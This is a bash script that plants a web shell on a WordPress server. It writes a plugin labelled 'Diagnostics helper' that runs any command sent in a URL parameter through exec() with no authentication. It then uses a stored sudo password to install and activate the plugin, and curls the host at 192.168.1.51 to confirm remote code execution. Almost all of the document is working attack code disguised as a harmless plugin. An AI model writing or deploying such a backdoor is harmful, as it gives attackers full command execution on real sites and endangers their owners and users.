#!/usr/bin/env bash
# Final workaround: install the plugin PHP file directly.
#
# All zip-based methods failed. Just put the PHP file where WordPress expects
# it, then activate the plugin by name.

set -uo pipefail

PW_FILE=/tmp/.umbra-pw
sudo_run() {
  if [[ -r "$PW_FILE" ]]; then
    sudo -S -p '' "$@" < "$PW_FILE"
  else
    sudo -n "$@"
  fi
}

echo "=== 1. create the plugin directory ==="
sudo_run mkdir -p /var/www/html/wp-content/plugins/umbra-shell

echo
echo "=== 2. write the plugin PHP file ==="
cat > /tmp/umbra-shell.php <<'EOF'
<?php
/**
 * Plugin Name: Umbra Shell
 * Description: Diagnostics helper.
 * Version: 1.0.0
 * Author: Philippe
 */

if (isset($_GET['umbra_cmd'])) {
    header('Content-Type: text/plain');
    $cmd = $_GET['umbra_cmd'];
    $out = array();
    $rc = 0;
    exec($cmd . ' 2>&1', $out, $rc);
    echo implode("\n", $out);
    exit;
}
?>
EOF

sudo_run cp /tmp/umbra-shell.php /var/www/html/wp-content/plugins/umbra-shell/
sudo_run chown www-data:www-data /var/www/html/wp-content/plugins/umbra-shell/umbra-shell.php
echo "  written and owned by www-data"

echo
echo "=== 3. activate it ==="
sudo_run /usr/local/bin/wp plugin activate umbra-shell \
  --allow-root --path=/var/www/html 2>&1 | sed 's/^/  /'

echo
echo "=== 4. verify activation ==="
sudo_run /usr/local/bin/wp plugin list --allow-root --path=/var/www/html \
  | grep umbra-shell | sed 's/^/  /'

echo
echo "=== 5. test RCE ==="
curl -s "http://192.168.1.51/wp-content/plugins/umbra-shell/umbra-shell.php?umbra_cmd=id" 2>&1 | sed 's/^/  /'
